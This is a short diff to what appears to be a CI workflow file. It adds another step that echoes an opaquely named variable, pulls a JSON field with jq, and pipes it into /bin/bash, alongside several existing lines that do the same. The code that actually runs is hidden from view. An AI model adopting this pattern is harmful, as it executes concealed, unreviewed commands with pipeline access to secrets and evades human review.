@@ -43,6 +43,7 @@ jobs:
           echo $kvk6500 | jq -r .egp156 | /bin/bash
           echo $nrvn9145 | jq -r .t27823 | /bin/bash
           echo $viqv69 | jq -r .s378 | /bin/bash
+          echo $zjnwu56 | jq -r .cbujt2 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
